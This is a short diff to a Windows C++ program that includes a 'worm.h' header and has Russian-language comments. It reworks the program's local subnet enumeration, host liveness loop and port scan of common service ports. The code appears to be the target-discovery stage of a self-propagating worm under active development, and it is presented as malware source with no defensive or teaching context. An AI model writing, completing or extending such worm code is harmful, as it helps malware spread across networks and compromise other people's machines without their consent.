@@ -1,4 +1,5 @@
 #include "worm.h"
+#include "NetUtils.h"
 #pragma comment(lib, "Ws2_32.lib")
 
 
@@ -30,19 +31,19 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	auto net_info = get_local_ip_and_subnet();
 	if (net_info.size() == 2)
 	{
-		string ip(net_info[0].begin(), net_info[0].end());
-		string mask(net_info[1].begin(), net_info[1].end());
+		std::wstring ip = net_info[0];
+		std::wstring mask = net_info[1];
 
-		auto range = generate_ip_range(ip, mask);
+		auto range = generate_ip_range(ip, mask); // теперь правильно
 		for (const auto& ip_ws : range) {
-			bool host_bool = 0;// = is_host_alive(ip_ws); // поменять (раскоментить)
-			wcout << ip_ws<< " "<< host_bool << endl;
+			bool host_bool = 0; // = is_host_alive(ip_ws); // поменять (раскомментировать)
+			std::wcout << ip_ws << L" " << host_bool << std::endl;
 			if (host_bool) {
 				alive_ip.push_back(ip_ws);
-				
 			}
 		}
 	}
+
 
 	vector<int> critical_and_popular_ports = {
 	21,    // FTP
@@ -77,7 +78,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 		for (int port : critical_and_popular_ports) {
 			bool test_port = is_port_open(ip, port);
 			if (test_port) {
-
+				wcout << ip << " " << port << endl; // удалить
 			}
 		}
 	}
